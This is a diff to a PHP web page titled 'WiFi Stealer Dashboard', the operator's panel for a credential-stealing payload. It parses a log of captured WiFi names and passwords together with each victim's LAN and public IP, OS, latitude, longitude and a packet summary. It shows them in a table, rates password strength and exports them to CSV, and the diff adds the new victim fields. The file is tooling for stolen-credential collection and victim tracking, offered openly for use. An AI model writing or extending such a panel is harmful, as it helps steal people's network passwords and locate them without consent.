@@ -1,145 +1,95 @@
 <?php
-// WiFi credential logger dashboard
-// Single-file implementation (with safer parsing and real capture time)
-// + CSV export (import kept as backend-only)
+// WiFi credential logger dashboard (extended)
+// Shows Victim LAN IP, OS, Public IP, LAN extra detail, Latitude, Longitude, Packet summary
 
 date_default_timezone_set('Asia/Kolkata');
 
 $logFile = __DIR__ . '/wifi_creds.log';
 
-// --- 1. CSV EXPORT: download all captures as CSV ---
-if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
-    if (!file_exists($logFile)) {
-        die('No data to export.');
+/**
+ * Parse a single CSV capture line into a normalized array.
+ *
+ * CSV order (your payload must match):
+ *  0: Timestamp
+ *  1: SSID
+ *  2: Password
+ *  3: Victim LAN IP
+ *  4: Victim OS
+ *  5: Public IP
+ *  6: LAN IP extra detail
+ *  7: Latitude
+ *  8: Longitude
+ *  9: Packet summary
+ *
+ * @param string $line
+ * @return array|null
+ */
+function parse_capture_line($line)
+{
+    $line = trim($line);
+    if ($line === '') {
+        return null;
     }
 
-    $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    if (empty($rawLines)) {
-        die('No captures to export.');
+    $fields = str_getcsv($line);
+    if (count($fields) < 5) {
+        return null;
     }
 
-    // Parse each line as CSV (Time, SSID, Pass, IP, OS)
-    $records = [];
-    foreach ($rawLines as $rawLine) {
-        $lines = preg_split('/\r\n|\r|\n/', $rawLine);
-        foreach ($lines as $line) {
-            $line = trim($line);
-            if ($line === '') continue;
+    $timeStr       = trim($fields[0] ?? '');
+    $ssid          = trim($fields[1] ?? '');
+    $pass          = trim($fields[2] ?? '');
+    $victimLanIp   = trim($fields[3] ?? '');
+    $victimOs      = trim($fields[4] ?? '');
+    $publicIp      = trim($fields[5] ?? '');
+    $lanIpExtra    = trim($fields[6] ?? '');
+    $latitude      = trim($fields[7] ?? '');
+    $longitude     = trim($fields[8] ?? '');
+    $pktSummary    = trim($fields[9] ?? '');
 
-            // Skip header row
-            if (stripos($line, 'time') !== false && stripos($line, 'ssid') !== false
-                && stripos($line, 'pass') !== false && stripos($line, 'ip') !== false
-                && stripos($line, 'os') !== false) {
-                continue;
-            }
-
-            $fields = str_getcsv($line);
-            if (count($fields) < 5) continue;
-
-            $timeStr  = isset($fields[0]) ? trim($fields[0]) : '';
-            $ssid     = isset($fields[1]) ? trim($fields[1]) : '';
-            $pass     = isset($fields[2]) ? trim($fields[2]) : '';
-            $sourceIP = isset($fields[3]) ? trim($fields[3]) : '';
-            $sourceOS = isset($fields[4]) ? trim($fields[4]) : '';
-
-            $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
-            if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
-                continue;
-            }
-
-            if ($pass === '') {
-                $pass = '(Not Found)';
-            }
-
-            $timestamp = $timeStr !== '' ? $timeStr : 'unknown';
-
-            $records[] = [
-                $timestamp,
-                $ssid,
-                $pass,
-                $sourceIP,
-                $sourceOS
-            ];
-        }
+    // Filter out header/garbage rows
+    $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
+    if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
+        return null;
     }
 
-    if (empty($records)) {
-        die('No valid captures to export.');
+    if ($pass === '') {
+        $pass = '(Not Found)';
     }
 
-    $filename = 'wifi_captures_' . date('Ymd_Hi') . '.csv';
-    header('Content-Type: text/csv; charset=utf-8');
-    header('Content-Disposition: attachment; filename="' . $filename . '"');
-    $fp = fopen('php://output', 'w');
+    $timestamp   = $timeStr !== '' ? $timeStr : 'unknown';
+    $passLength  = strlen($pass);
+    $allLetters  = ($pass !== '' && ctype_alpha($pass));
+    $allNumbers  = ($pass !== '' && ctype_digit($pass));
+    $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);
 
-    // Renamed column from "Attacker IP" to "Victim IP"
-    fputcsv($fp, ['Time', 'SSID', 'Password', 'Victim IP', 'OS']);
-
-    foreach ($records as $row) {
-        fputcsv($fp, $row);
-    }
-
-    fclose($fp);
-    exit;
+    return [
+        'time'         => $timestamp,
+        'ssid'         => $ssid,
+        'password'     => $pass,
+        'len'          => $passLength,
+        'weak'         => $weakPassword,
+        'ip_main'      => $victimLanIp !== '' ? $victimLanIp : 'offline',
+        'os'           => $victimOs !== '' ? $victimOs : 'unknown',
+        'public_ip'    => $publicIp !== '' ? $publicIp : 'unknown',
+        'lan_ip_extra' => $lanIpExtra !== '' ? $lanIpExtra : 'N/A',
+        'latitude'     => $latitude !== '' ? $latitude : 'N/A',
+        'longitude'    => $longitude !== '' ? $longitude : 'N/A',
+        'pkt_summary'  => $pktSummary !== '' ? $pktSummary : 'N/A',
+    ];
 }
 
-// --- 2. CSV IMPORT: backend-only (no visible form) ---
-if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
-    if (!isset($_FILES['csv_file']) || $_FILES['csv_file']['error'] !== UPLOAD_ERR_OK) {
-        $importStatus = 'Error: No file uploaded or upload failed.';
-    } else {
-        $tmpName = $_FILES['csv_file']['tmp_name'];
-        if (!is_uploaded_file($tmpName)) {
-            $importStatus = 'Invalid upload.';
-        } else {
-            $fp = fopen($tmpName, 'r');
-            if (!$fp) {
-                $importStatus = 'Cannot read uploaded file.';
-            } else {
-                $addedCount = 0;
-                // single backslash as escape
-                while (($fields = fgetcsv($fp, 0, ',', '"', '\\')) !== false) {
-                    if (count($fields) >= 5) {
-                        $line = '"' . implode('","', array_map('trim', $fields)) . '"' . PHP_EOL;
-                        file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);
-                        $addedCount++;
-                    }
-                }
-                fclose($fp);
-                $importStatus = "Imported $addedCount captures from CSV.";
-            }
-        }
-    }
+/**
+ * Safe HTML escape.
+ */
+function h($v)
+{
+    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
 }
 
-// --- 3. Clear all entries if requested ---
-if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
-    if (file_exists($logFile)) {
-        $handle = fopen($logFile, 'w');
-        if ($handle) {
-            fclose($handle);
-        }
-    }
-    header('Location: ' . $_SERVER['PHP_SELF']);
-    exit;
-}
-
-// --- 4. Delete single entry ---
-if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
-    $index = isset($_POST['idx']) ? intval($_POST['idx']) : -1;
-
-    if (file_exists($logFile) && $index >= 0) {
-        $fileLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        if (isset($fileLines[$index])) {
-            unset($fileLines[$index]);
-            file_put_contents($logFile, implode(PHP_EOL, $fileLines) . PHP_EOL);
-        }
-    }
-    header('Location: ' . $_SERVER['PHP_SELF']);
-    exit;
-}
-
-// --- 5. OS detection from user agent ---
+/**
+ * Simple OS detection from user agent (for viewer info only).
+ */
 function detectOS($userAgent) {
     $ua = strtolower($userAgent);
 
@@ -154,11 +104,128 @@ function detectOS($userAgent) {
     return 'Unknown';
 }
 
+// --- 1. CSV EXPORT: download all captures as CSV (extended) ---
+if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
+    if (!file_exists($logFile)) {
+        die('No data to export.');
+    }
+
+    $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if (empty($rawLines)) {
+        die('No captures to export.');
+    }
+
+    $records = [];
+    foreach ($rawLines as $rawLine) {
+        $entry = parse_capture_line($rawLine);
+        if ($entry === null) {
+            continue;
+        }
+        $records[] = [
+            $entry['time'],
+            $entry['ssid'],
+            $entry['password'],
+            $entry['ip_main'],
+            $entry['os'],
+            $entry['public_ip'],
+            $entry['lan_ip_extra'],
+            $entry['latitude'],
+            $entry['longitude'],
+            $entry['pkt_summary'],
+        ];
+    }
+
+    if (empty($records)) {
+        die('No valid captures to export.');
+    }
+
+    $filename = 'wifi_captures_' . date('Ymd_Hi') . '.csv';
+    header('Content-Type: text/csv; charset=utf-8');
+    header('Content-Disposition: attachment; filename="' . $filename . '"');
+    $fp = fopen('php://output', 'w');
+
+    fputcsv($fp, [
+        'Time',
+        'SSID',
+        'Password',
+        'Victim LAN IP',
+        'Victim OS',
+        'Public IP',
+        'LAN extra',
+        'Latitude',
+        'Longitude',
+        'Packet summary'
+    ]);
+
+    foreach ($records as $row) {
+        fputcsv($fp, $row);
+    }
+
+    fclose($fp);
+    exit;
+}
+
+// --- 2. CSV IMPORT: backend-only (unchanged, still expects at least 5 fields) ---
+if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
+    if (!isset($_FILES['csv_file']) || $_FILES['csv_file']['error'] !== UPLOAD_ERR_OK) {
+        $importStatus = 'Error: No file uploaded or upload failed.';
+    } else {
+        $tmpName = $_FILES['csv_file']['tmp_name'];
+        if (!is_uploaded_file($tmpName)) {
+            $importStatus = 'Invalid upload.';
+        } else {
+            $fp = fopen($tmpName, 'r');
+            if (!$fp) {
+                $importStatus = 'Cannot read uploaded file.';
+            } else {
+                $addedCount = 0;
+                while (($fields = fgetcsv($fp, 0, ',', '"', '\\')) !== false) {
+                    if (count($fields) >= 5) {
+                        $line = '"' . implode('","', array_map('trim', $fields)) . '"' . PHP_EOL;
+                        file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);
+                        $addedCount++;
+                    }
+                }
+                fclose($fp);
+                $importStatus = "Imported $addedCount captures from CSV.";
+            }
+        }
+    }
+}
+
+// --- 3. Clear all entries ---
+if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
+    if (file_exists($logFile)) {
+        $handle = fopen($logFile, 'w');
+        if ($handle) {
+            fclose($handle);
+        }
+    }
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- 4. Delete single entry (line index in log file) ---
+if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
+    $index = isset($_POST['idx']) ? intval($_POST['idx']) : -1;
+
+    if (file_exists($logFile) && $index >= 0) {
+        $fileLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        if (isset($fileLines[$index])) {
+            unset($fileLines[$index]);
+            file_put_contents($logFile, implode(PHP_EOL, $fileLines) . PHP_EOL);
+        }
+    }
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- 5. Viewer info ---
 $viewerIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 $viewerUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $viewerOS = detectOS($viewerUA);
 
-// --- 6. Read log file (CSV) ---
+// --- 6. Read and parse captures ---
 $rawLines = [];
 if (file_exists($logFile)) {
     $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
@@ -171,73 +238,30 @@ $totalPasswordLength = 0;
 $weakPasswords = 0;
 $captureEntries = [];
 
-// --- 7. Parse CSV lines into captures ---
-foreach ($rawLines as $rawLine) {
-    $lines = preg_split('/\r\n|\r|\n/', $rawLine);
-    foreach ($lines as $line) {
-        $line = trim($line);
-        if ($line === '') continue;
-
-        // Skip header row
-        if (stripos($line, 'time') !== false && stripos($line, 'ssid') !== false
-            && stripos($line, 'pass') !== false && stripos($line, 'ip') !== false
-            && stripos($line, 'os') !== false) {
-            continue;
-        }
-
-        $fields = str_getcsv($line);
-        if (count($fields) < 5) continue;
-
-        $timeStr  = isset($fields[0]) ? trim($fields[0]) : '';
-        $ssid     = isset($fields[1]) ? trim($fields[1]) : '';
-        $pass     = isset($fields[2]) ? trim($fields[2]) : '';
-        $sourceIP = isset($fields[3]) ? trim($fields[3]) : '';
-        $sourceOS = isset($fields[4]) ? trim($fields[4]) : '';
-
-        $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
-        if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
-            continue;
-        }
-
-        if ($pass === '') {
-            $pass = '(Not Found)';
-        }
-
-        $timestamp = $timeStr !== '' ? $timeStr : 'unknown';
-
-        $totalCaptures++;
-
-        if ($ssid !== '') {
-            $ssidCount[$ssid] = isset($ssidCount[$ssid]) ? $ssidCount[$ssid] + 1 : 1;
-        }
-
-        if ($sourceIP !== '') {
-            $ipCount[$sourceIP] = isset($ipCount[$sourceIP]) ? $ipCount[$sourceIP] + 1 : 1;
-        }
-
-        $passLength = strlen($pass);
-        $totalPasswordLength += $passLength;
-
-        $allLetters   = ($pass !== '' && ctype_alpha($pass));
-        $allNumbers   = ($pass !== '' && ctype_digit($pass));
-        $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);
-
-        if ($weakPassword) {
-            $weakPasswords++;
-        }
-
-        $captureEntries[] = [
-            // index will still be 0-based here; we’ll display +1 in HTML
-            'idx'      => count($captureEntries),
-            'time'     => $timestamp,
-            'ip'       => $sourceIP !== '' ? $sourceIP : 'offline',
-            'os'       => $sourceOS !== '' ? $sourceOS : 'unknown',
-            'ssid'     => $ssid,
-            'password' => $pass,
-            'len'      => $passLength,
-            'weak'     => $weakPassword,
-        ];
+foreach ($rawLines as $idx => $rawLine) {
+    $entry = parse_capture_line($rawLine);
+    if ($entry === null) {
+        continue;
     }
+
+    $totalCaptures++;
+
+    if ($entry['ssid'] !== '') {
+        $ssidCount[$entry['ssid']] = ($ssidCount[$entry['ssid']] ?? 0) + 1;
+    }
+
+    if ($entry['ip_main'] !== 'offline') {
+        $ipCount[$entry['ip_main']] = ($ipCount[$entry['ip_main']] ?? 0) + 1;
+    }
+
+    $totalPasswordLength += $entry['len'];
+    if ($entry['weak']) {
+        $weakPasswords++;
+    }
+
+    $entry['idx'] = count($captureEntries);   // display index
+    $entry['log_index'] = $idx;              // actual line index for deletion
+    $captureEntries[] = $entry;
 }
 
 $uniqueSSIDs     = count($ssidCount);
@@ -245,9 +269,8 @@ $uniqueIPs       = count($ipCount);
 $avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
 $weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
 
-// --- 8. View mode selection ---
-$viewMode = isset($_GET['view']) ? $_GET['view'] : 'full';
-$viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
+// --- 7. View mode ---
+$viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'full';
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -308,6 +331,7 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             background: linear-gradient(135deg, rgba(15,23,42,0.95), rgba(15,23,42,0.6));
             color: #e5e7eb;
             cursor: pointer;
+            text-decoration: none;
         }
         .btn:hover {
             border-color: #4f46e5;
@@ -364,6 +388,7 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             padding: 6px 8px;
             border-bottom: 1px solid rgba(55,65,81,0.8);
             text-align: left;
+            vertical-align: top;
         }
         th {
             font-size: 11px;
@@ -400,6 +425,21 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             padding-top: 8px;
             border-top: 1px solid rgba(31,41,55,0.9);
         }
+        @media (max-width: 768px) {
+            table, thead, tbody, th, td, tr {
+                display: block;
+            }
+            thead {
+                display: none;
+            }
+            tr {
+                margin-bottom: 10px;
+            }
+            td {
+                border: none;
+                padding: 4px 6px;
+            }
+        }
     </style>
     <script>
         var autoRefresh = false;
@@ -408,46 +448,26 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
 
         function toggleAutoRefresh(enabled) {
             autoRefresh = enabled;
-
             if (refreshTimer) {
                 clearInterval(refreshTimer);
                 refreshTimer = null;
             }
-
             var toggleBtn = document.getElementById('auto-refresh-toggle');
-
             if (autoRefresh) {
                 refreshTimer = setInterval(function() {
                     window.location.reload();
                 }, REFRESH_INTERVAL);
-
-                if (toggleBtn) {
-                    toggleBtn.innerText = 'Auto-refresh: ON';
-                }
-
-                if (window.localStorage) {
-                    localStorage.setItem('wifi_dashboard_auto_refresh', 'on');
-                }
+                if (toggleBtn) toggleBtn.innerText = 'Auto-refresh: ON';
+                if (window.localStorage) localStorage.setItem('wifi_dashboard_auto_refresh', 'on');
             } else {
-                if (toggleBtn) {
-                    toggleBtn.innerText = 'Auto-refresh: OFF';
-                }
-
-                if (window.localStorage) {
-                    localStorage.setItem('wifi_dashboard_auto_refresh', 'off');
-                }
+                if (toggleBtn) toggleBtn.innerText = 'Auto-refresh: OFF';
+                if (window.localStorage) localStorage.setItem('wifi_dashboard_auto_refresh', 'off');
             }
         }
 
         document.addEventListener('DOMContentLoaded', function() {
-            var enableByDefault = true;
-            var savedPreference = null;
-
-            if (window.localStorage) {
-                savedPreference = localStorage.getItem('wifi_dashboard_auto_refresh');
-            }
-
-            if (savedPreference === 'on' || (savedPreference === null && enableByDefault)) {
+            var savedPreference = window.localStorage ? localStorage.getItem('wifi_dashboard_auto_refresh') : null;
+            if (savedPreference === 'on' || savedPreference === null) {
                 toggleAutoRefresh(true);
             } else {
                 toggleAutoRefresh(false);
@@ -461,66 +481,53 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
         <div class="title-group">
             <div class="title">WiFi Stealer Dashboard</div>
             <div class="subtitle">
-                Captures: <?php echo htmlspecialchars($totalCaptures); ?> •
-                Timezone: IST (12-hour)
+                Captures: <?php echo h($totalCaptures); ?> • Timezone: IST
             </div>
             <div class="viewer-meta">
-                You are viewing from IP <?php echo htmlspecialchars($viewerIP); ?> on <?php echo htmlspecialchars($viewerOS); ?>
+                You are viewing from IP <?php echo h($viewerIP); ?> on <?php echo h($viewerOS); ?>
             </div>
-        </div>
         <div class="actions">
             <a href="?action=export_csv" class="btn">Export to CSV</a>
-            <a href="?view=full" class="btn btn-sm"
-               style="text-decoration:none; <?php echo $viewMode === 'full' ? 'border-color:#4f46e5;' : ''; ?>">
+            <a href="?view=full" class="btn btn-sm" style="<?php echo $viewMode === 'full' ? 'border-color:#4f46e5;' : ''; ?>">
                 Full view
             </a>
-            <a href="?view=compact" class="btn btn-sm"
-               style="text-decoration:none; <?php echo $viewMode === 'compact' ? 'border-color:#4f46e5;' : ''; ?>">
+            <a href="?view=compact" class="btn btn-sm" style="<?php echo $viewMode === 'compact' ? 'border-color:#4f46e5;' : ''; ?>">
                 Compact view
             </a>
-            <button type="button"
-                    class="btn"
-                    id="auto-refresh-toggle"
-                    onclick="toggleAutoRefresh(!autoRefresh);">
+            <button type="button" class="btn" id="auto-refresh-toggle" onclick="toggleAutoRefresh(!autoRefresh);">
                 Auto-refresh: OFF
             </button>
-            <form method="post"
-                  onsubmit="return confirm('Delete ALL history? This cannot be undone.');"
-                  style="display:inline;">
+            <form method="post" onsubmit="return confirm('Delete ALL history? This cannot be undone.');" style="display:inline;">
                 <input type="hidden" name="action" value="clear_all">
-                <button type="submit" class="btn btn-danger">
-                    Clear all history
-                </button>
+                <button type="submit" class="btn btn-danger">Clear all history</button>
             </form>
         </div>
     </div>
 
     <?php if (isset($importStatus)): ?>
-        <p style="font-size: 0.9em; color: #fecaca; margin: 4px 0;">
-            <?= htmlspecialchars($importStatus); ?>
-        </p>
+        <p style="font-size: 0.9em; color: #fecaca; margin: 4px 0;"><?php echo h($importStatus); ?></p>
     <?php endif; ?>
 
     <div class="stats-grid">
         <div class="stat-card">
             <div class="stat-label">Total captures</div>
-            <div class="stat-value"><?php echo htmlspecialchars($totalCaptures); ?></div>
+            <div class="stat-value"><?php echo h($totalCaptures); ?></div>
         </div>
         <div class="stat-card">
             <div class="stat-label">Unique SSIDs</div>
-            <div class="stat-value"><?php echo htmlspecialchars($uniqueSSIDs); ?></div>
+            <div class="stat-value"><?php echo h($uniqueSSIDs); ?></div>
         </div>
         <div class="stat-card">
             <div class="stat-label">Source IPs</div>
-            <div class="stat-value"><?php echo htmlspecialchars($uniqueIPs); ?></div>
+            <div class="stat-value"><?php echo h($uniqueIPs); ?></div>
         </div>
         <div class="stat-card">
             <div class="stat-label">Avg password length</div>
-            <div class="stat-value"><?php echo htmlspecialchars($avgPasswordLen); ?></div>
+            <div class="stat-value"><?php echo h($avgPasswordLen); ?></div>
         </div>
         <div class="stat-card">
             <div class="stat-label">Weak passwords</div>
-            <div class="stat-value"><?php echo htmlspecialchars($weakPercentage); ?>%</div>
+            <div class="stat-value"><?php echo h($weakPercentage); ?>%</div>
         </div>
     </div>
 
@@ -529,16 +536,18 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             <thead>
             <tr>
                 <th>#</th>
-                <th>Time (IST)</th>
-                <?php if ($viewMode === 'full'): ?>
-                    <th>Victim IP</th>
-                    <th>OS</th>
-                <?php endif; ?>
+                <th>Time</th>
                 <th>SSID</th>
                 <?php if ($viewMode === 'full'): ?>
                     <th>Password</th>
-                    <th>Length</th>
+                    <th>Len</th>
                     <th>Strength</th>
+                    <th>Victim LAN IP</th>
+                    <th>LAN extra</th>
+                    <th>Public IP</th>
+                    <th>Location (Lat, Lon)</th>
+                    <th>Packet summary</th>
+                    <th>OS</th>
                 <?php else: ?>
                     <th>Pass / strength</th>
                 <?php endif; ?>
@@ -548,29 +557,18 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             <tbody>
             <?php if (empty($captureEntries)): ?>
                 <tr>
-                    <td colspan="9" style="text-align:center; padding:12px; color:#9ca3af;">
-                        No captures yet.
-                    </td>
+                    <td colspan="13" style="text-align:center; padding:12px; color:#9ca3af;">No captures yet.</td>
                 </tr>
             <?php else: ?>
                 <?php foreach ($captureEntries as $entry): ?>
                     <tr>
-                        <!-- Start counting from 1 -->
-                        <td><?php echo htmlspecialchars($entry['idx'] + 1); ?></td>
-                        <td><?php echo htmlspecialchars($entry['time']); ?></td>
+                        <td><?php echo h($entry['idx'] + 1); ?></td>
+                        <td><?php echo h($entry['time']); ?></td>
+                        <td><?php echo h($entry['ssid']); ?></td>
 
                         <?php if ($viewMode === 'full'): ?>
-                            <td><?php echo htmlspecialchars($entry['ip']); ?></td>
-                            <td><?php echo htmlspecialchars($entry['os']); ?></td>
-                        <?php endif; ?>
-
-                        <td><?php echo htmlspecialchars($entry['ssid']); ?></td>
-
-                        <?php if ($viewMode === 'full'): ?>
-                            <td class="password">
-                                <?php echo htmlspecialchars($entry['password']); ?>
-                            </td>
-                            <td><?php echo htmlspecialchars($entry['len']); ?></td>
+                            <td class="password"><?php echo h($entry['password']); ?></td>
+                            <td><?php echo h($entry['len']); ?></td>
                             <td>
                                 <?php if ($entry['weak']): ?>
                                     <span class="badge badge-weak">weak</span>
@@ -578,12 +576,15 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
                                     <span class="badge badge-ok">ok</span>
                                 <?php endif; ?>
                             </td>
+                            <td><?php echo h($entry['ip_main']); ?></td>
+                            <td><?php echo h($entry['lan_ip_extra']); ?></td>
+                            <td><?php echo h($entry['public_ip']); ?></td>
+                            <td><?php echo h($entry['latitude'] . ', ' . $entry['longitude']); ?></td>
+                            <td><?php echo h($entry['pkt_summary']); ?></td>
+                            <td><?php echo h($entry['os']); ?></td>
                         <?php else: ?>
                             <td>
-                                <span class="password">
-                                    <?php echo htmlspecialchars($entry['password']); ?>
-                                </span>
-                                <br>
+                                <span class="password"><?php echo h($entry['password']); ?></span><br>
                                 <?php if ($entry['weak']): ?>
                                     <span class="badge badge-weak">weak</span>
                                 <?php else: ?>
@@ -593,15 +594,10 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
                         <?php endif; ?>
 
                         <td>
-                            <form method="post"
-                                  style="display:inline;"
-                                  onsubmit="return confirm('Delete this entry?');">
+                            <form method="post" style="display:inline;" onsubmit="return confirm('Delete this entry?');">
                                 <input type="hidden" name="action" value="delete_one">
-                                <!-- still pass the 0-based idx key to delete -->
-                                <input type="hidden" name="idx" value="<?php echo htmlspecialchars($entry['idx']); ?>">
-                                <button type="submit" class="btn btn-sm btn-danger">
-                                    Delete
-                                </button>
+                                <input type="hidden" name="idx" value="<?php echo h($entry['log_index']); ?>">
+                                <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                             </form>
                         </td>
                     </tr>
@@ -612,7 +608,7 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
     </div>
 
     <div class="footer">
-        © 2026 WiFi Stealer Dashboard – made by narain
+        © 2026 WiFi Stealer Dashboard - Made By Zypher17
     </div>
 </div>
 </body>
